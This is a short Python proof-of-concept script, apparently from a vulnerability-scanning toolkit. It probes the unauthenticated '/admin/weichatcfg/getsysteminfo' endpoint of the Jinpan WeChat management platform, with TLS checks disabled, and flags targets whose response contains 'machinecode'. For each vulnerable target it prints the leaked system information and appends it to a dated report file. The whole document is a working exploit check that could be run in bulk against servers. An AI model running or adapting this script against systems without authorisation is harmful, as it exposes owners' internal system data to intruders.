import requests
import time

import buter

filename = "./reps/金盘微信管理平台getsysteminfo未授权-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc ='/admin/weichatcfg/getsysteminfo'

def kpgetinfoun(url):
    try:
        rep = requests.get(url=url+poc,headers=headers,verify=False,timeout=3)
        if rep.status_code == 200 and 'machinecode' in rep.text:
            print(buter.colors.GREEN + f"存在金盘微信管理平台getsysteminfo未授权  url : {url} output : {rep.text}" + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(f"{url} : {rep.text}")
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED + f"未发现金盘微信管理平台getsysteminfo未授权漏洞 url : {url}" + buter.colors.END)
    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}"+ buter.colors.END)


